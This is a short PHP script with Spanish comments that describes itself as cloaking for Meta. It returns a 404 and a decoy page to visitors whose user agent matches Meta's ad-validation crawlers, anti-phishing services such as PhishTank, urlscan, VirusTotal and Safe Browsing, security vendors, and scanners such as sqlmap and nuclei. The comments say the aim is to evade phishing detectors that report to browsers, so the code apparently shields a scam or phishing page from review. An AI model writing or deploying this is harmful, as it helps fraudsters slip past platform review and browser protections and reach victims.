<?php
/* _guard.php — Cloaking laser para Meta. Solo bloquea lo IMPRESCINDIBLE. */
(function () {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if ($ua === '') return; // Permite, no es nuestro problema

    // SOLO bloqueamos:
    //   - Crawlers de validación de Meta
    //   - AVs de phishing (los que reportan a navegadores)
    //   - Scanners de seguridad obvios
    $bl = '/('
        . 'facebookexternalhit|facebot|facebookbot|meta-externalagent|metabot|'
        . 'phishtank|netcraft|urlscan|virustotal|safebrowsing|sucuri|wordfence|'
        . 'trendmicro|paloalto|fortinet|symantec|mcafee|sophos|kaspersky|'
        . 'bitdefender|talos|zscaler|nessus|acunetix|nikto|sqlmap|nuclei'
        . ')/i';

    if (preg_match($bl, $ua)) {
        http_response_code(404);
        if (file_exists(__DIR__ . '/blocked.html')) readfile(__DIR__ . '/blocked.html');
        exit;
    }
})();
